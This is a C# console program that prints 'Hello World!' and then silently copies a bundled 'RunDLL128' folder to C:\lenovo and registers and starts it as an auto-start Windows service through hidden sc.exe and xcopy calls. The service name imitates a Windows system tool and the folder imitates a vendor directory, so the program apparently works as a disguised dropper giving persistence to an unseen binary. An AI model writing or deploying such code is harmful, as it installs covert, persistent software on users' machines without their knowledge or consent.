using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace EnhanceExperience
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World!");

            InstallRunDLL128();
        }

        private static void InstallRunDLL128()
        {
            CopyRunDLL128();

            ProcessStartInfo pInfo = new()
            {
                FileName = "sc.exe",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = "QUERY RunDLL128",
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };

            Process p = Process.Start(pInfo);
            p.WaitForExit();

            string erroroutput;
            using (StreamReader r = p.StandardError)
            {
                erroroutput = r.ReadToEnd();
            }

            string output;
            using (StreamReader r = p.StandardOutput)
            {
                output = r.ReadToEnd();
            }

            if (!string.IsNullOrEmpty(erroroutput))
            {
                return;
            }

            Console.WriteLine(output);

            pInfo = new()
            {
                FileName = "sc.exe",
                UseShellExecute = true,
                CreateNoWindow = true,
                Arguments = "CREATE RunDLL128 binpath=\"C:\\lenovo\\RunDLL128\\RunDLL128.exe\" start=delayed-auto"
            };

            p = Process.Start(pInfo);
            p.WaitForExit();

            pInfo = new()
            {
                FileName = "sc.exe",
                UseShellExecute = true,
                CreateNoWindow = true,
                Arguments = "START RunDLL128"
            };

            p = Process.Start(pInfo);
            p.WaitForExit();
        }

        private static void CopyRunDLL128()
        {
            string path = Path.Combine(Path.GetDirectoryName(typeof(Program).Assembly.Location), "RunDLL128");

            if (!Directory.Exists(@"C:\lenovo"))
            {
                Directory.CreateDirectory(@"C:\lenovo");
            }

            ProcessStartInfo pInfo = new()
            {
                Arguments = $"/Y/S/R/I \"{path}\" \"C:\\lenovo\\RunDLL128\"",
                UseShellExecute = true,
                CreateNoWindow = true,
                FileName = "xcopy.exe"
            };

            Process p = Process.Start(pInfo);

            p.WaitForExit();
        }
    }
}